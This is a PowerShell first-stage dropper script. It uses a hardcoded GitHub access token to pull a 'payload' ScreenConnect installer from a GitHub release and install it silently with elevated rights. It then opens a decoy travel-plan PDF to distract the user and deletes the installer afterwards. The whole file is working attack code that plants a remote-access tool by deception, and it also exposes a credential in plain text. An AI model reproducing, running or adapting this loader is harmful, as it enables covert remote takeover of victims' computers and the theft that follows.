# stage1.ps1 - Fixed error handling
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$tk = "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"
$gh = @{"Authorization"="token $tk";"Accept"="application/vnd.github.v3+json"}

# === 1. Download MSI via GitHub release asset API ===
$msiPath = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
Remove-Item $msiPath -Force -ErrorAction SilentlyContinue

try {
    $rel = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/releases/tags/payload" -Headers $gh
    $assetUrl = $rel.assets[0].url
    Invoke-WebRequest -Uri $assetUrl -Headers @{"Authorization"="token $tk";"Accept"="application/octet-stream"} -OutFile $msiPath -TimeoutSec 180
} catch {}

if (-not (Test-Path $msiPath)) { exit }
if ((Get-Item $msiPath).Length -lt 1000000) { exit }

# === 2. UAC Install ===
Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -Wait

# === 3. PDF Decoy ===
try {
    $fi = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Travel_Plan_Meeting_Q4_2026.pdf" -Headers $gh
    $pdfPath = Join-Path $env:TEMP "Travel_Plan_Meeting_Q4_2026.pdf"
    Invoke-WebRequest -Uri $fi.download_url -Headers $gh -OutFile $pdfPath -TimeoutSec 30
    if (Test-Path $pdfPath) {
        $edge = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        if (Test-Path $edge) { Start-Process $edge -ArgumentList "`"$pdfPath`"" }
    }
} catch {}

# === 4. Cleanup ===
Start-Sleep 3
Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
